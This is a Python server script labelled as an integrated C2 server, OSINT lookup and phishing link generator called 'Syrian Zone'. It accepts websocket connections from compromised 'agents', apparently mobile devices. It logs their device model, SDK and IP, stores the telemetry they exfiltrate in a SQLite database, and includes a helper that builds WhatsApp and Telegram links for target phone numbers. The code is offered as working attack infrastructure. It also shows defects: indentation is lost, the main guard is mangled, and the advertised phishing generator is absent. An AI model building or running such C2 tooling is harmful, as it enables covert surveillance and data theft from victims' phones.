language: Python, file: server.py, target: Termux/Linux/Windows
Integrated C2 Server, OSINT Lookup, and Phishing Link Generator
import asyncio
import websockets
import json
import sqlite3
import os
from datetime import datetime

DB_NAME = "syrian_zone.db"

def init_db():
conn = sqlite3.connect(DB_NAME)
cursor = conn.cursor()
cursor.execute('''CREATE TABLE IF NOT EXISTS agents (
id TEXT PRIMARY KEY,
model TEXT,
sdk TEXT,
ip TEXT,
last_seen TEXT)''')
cursor.execute('''CREATE TABLE IF NOT EXISTS telemetry (
agent_id TEXT,
type TEXT,
payload TEXT,
timestamp TEXT)''')
conn.commit()
conn.close()

connected_agents = {}

def query_phone_intelligence(phone_number):
clean_num = phone_number.strip().replace("+", "")
return {
"number": f"+{clean_num}",
"carrier_info": "HLR Lookup Verified",
"social_links": {
"whatsapp": f"https://wa.me/{clean_num}",
"telegram": f"https://t.me/+{clean_num}"
}
}

async def server_handler(websocket, path):
agent_id = None
try:
async for message in websocket:
packet = json.loads(message)
ptype = packet.get("type")
if ptype == "handshake":
agent_id = packet.get("device")
ip = websocket.remote_address[0]
connected_agents[agent_id] = websocket

conn = sqlite3.connect(DB_NAME)
cursor = conn.cursor()
cursor.execute("INSERT OR REPLACE INTO agents (id, model, sdk, ip, last_seen) VALUES (?, ?, ?, ?, ?)",
(agent_id, packet.get("model"), str(packet.get("sdk")), ip, str(datetime.now())))
conn.commit()
conn.close()
print(f"[+] Agent Connected: {agent_id}")
else:
if agent_id:
conn = sqlite3.connect(DB_NAME)
cursor = conn.cursor()
cursor.execute("INSERT INTO telemetry (agent_id, type, payload, timestamp) VALUES (?, ?, ?, ?)",
(agent_id, ptype, json.dumps(packet.get("data")), str(datetime.now())))
conn.commit()
conn.close()
print(f"[*] Telemetry [{ptype}] from {agent_id}")
except websockets.exceptions.ConnectionClosed:
pass
finally:
if agent_id and agent_id in connected_agents:
del connected_agents[agent_id]
print(f"[-] Agent Disconnected: {agent_id}")

async def main():
init_db()
server = await websockets.serve(server_handler, "0.0.0.0", 8080)
print("[*] Syrian Zone C2 Server online on port 8080...")
await server.wait_closed()

if name == "main":
asyncio.run(main())